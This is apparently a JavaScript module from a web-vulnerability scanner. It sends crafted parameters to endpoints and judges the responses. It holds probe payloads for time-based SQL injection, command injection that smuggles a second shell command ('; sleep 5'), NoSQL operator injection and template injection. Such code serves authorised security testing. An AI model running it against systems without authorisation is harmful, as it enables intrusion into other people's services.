// Phase 3: Exploitation Engine - Send payloads and analyze responses
const axios = require('axios');

class ExploitationEngine {
  /**
   * Execute exploitation test
   */
  static async executeTest(endpoint, parameter, payload, method = 'GET') {
    try {
      const url = new URL(endpoint.url);
      const config = {
        timeout: 15000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        maxRedirects: 5,
        validateStatus: () => true // Don't throw on any status
      };

      let response;

      if (method === 'GET') {
        url.searchParams.set(parameter.name, payload.payload);
        response = await axios.get(url.toString(), config);
      } else if (method === 'POST') {
        const data = new URLSearchParams();
        data.append(parameter.name, payload.payload);
        response = await axios.post(endpoint.url, data.toString(), config);
      } else if (method === 'PUT') {
        const data = new URLSearchParams();
        data.append(parameter.name, payload.payload);
        response = await axios.put(endpoint.url, data.toString(), config);
      } else if (method === 'DELETE') {
        response = await axios.delete(endpoint.url, config);
      } else if (method === 'PATCH') {
        response = await axios.patch(endpoint.url, { [parameter.name]: payload.payload }, config);
      }

      return {
        success: true,
        status: response.status,
        headers: response.headers,
        data: response.data,
        timing: Date.now()
      };
    } catch (error) {
      return {
        success: false,
        error: error.message,
        timing: Date.now()
      };
    }
  }

  /**
   * Batch execute tests
   */
  static async executeBatchTests(endpoint, parameters, payloads, method = 'GET') {
    const results = [];

    for (const parameter of parameters) {
      for (const payload of payloads) {
        const result = await this.executeTest(endpoint, parameter, payload, method);
        results.push({
          parameter: parameter.name,
          payload: payload.payload,
          type: payload.type,
          ...result
        });

        // Throttle requests
        await new Promise(resolve => setTimeout(resolve, 100));
      }
    }

    return results;
  }

  /**
   * Detect time-based blind vulnerabilities
   */
  static async detectTimeBasedVulnerability(endpoint, parameter, delaySeconds = 5) {
    const payloads = [
      { payload: `' AND SLEEP(${delaySeconds})--`, type: 'SQLi' },
      { payload: `; sleep ${delaySeconds}`, type: 'CommandInjection' }
    ];

    const baselineStart = Date.now();
    const baselineResponse = await this.executeTest(endpoint, parameter, { payload: 'test' });
    const baselineTime = Date.now() - baselineStart;

    for (const payload of payloads) {
      const testStart = Date.now();
      const testResponse = await this.executeTest(endpoint, parameter, payload);
      const testTime = Date.now() - testStart;

      // If response time is significantly delayed, vulnerability likely exists
      if (testTime > (delaySeconds * 1000 * 0.8)) {
        return {
          vulnerable: true,
          type: payload.type,
          delay: testTime - baselineTime,
          expected: delaySeconds * 1000
        };
      }
    }

    return { vulnerable: false };
  }

  /**
   * Error-based extraction
   */
  static async extractErrorBasedData(endpoint, parameter, extractionPayloads) {
    const results = [];

    for (const payload of extractionPayloads) {
      const response = await this.executeTest(endpoint, parameter, payload);
      if (response.success) {
        results.push({
          payload: payload.payload,
          responseSnippet: response.data.substring(0, 500) || '',
          status: response.status
        });
      }
    }

    return results;
  }

  /**
   * Test for NoSQL injection
   */
  static async testNoSQLInjection(endpoint, parameter) {
    const payloads = [
      { payload: '{"$ne": null}', type: 'NoSQLi' },
      { payload: '{"$gt": ""}', type: 'NoSQLi' },
      { payload: '{"$regex": ".*"}', type: 'NoSQLi' }
    ];

    const results = [];
    for (const payload of payloads) {
      const response = await this.executeTest(endpoint, parameter, payload, 'POST');
      results.push({
        payload: payload.payload,
        vulnerable: response.success && response.status === 200,
        response: response
      });
    }

    return results;
  }

  /**
   * Test for template injection
   */
  static async testTemplateInjection(endpoint, parameter) {
    const payloads = [
      { payload: '${7*7}', type: 'TemplateInjection' },
      { payload: '#{7*7}', type: 'TemplateInjection' },
      { payload: '{{ 7 * 7 }}', type: 'TemplateInjection' },
      { payload: '<%= 7 * 7 %>', type: 'TemplateInjection' }
    ];

    const results = [];
    for (const payload of payloads) {
      const response = await this.executeTest(endpoint, parameter, payload);
      if (response.success && response.data && response.data.includes('49')) {
        results.push({
          payload: payload.payload,
          vulnerable: true,
          type: payload.type
        });
      }
    }

    return results;
  }
}

module.exports = ExploitationEngine;
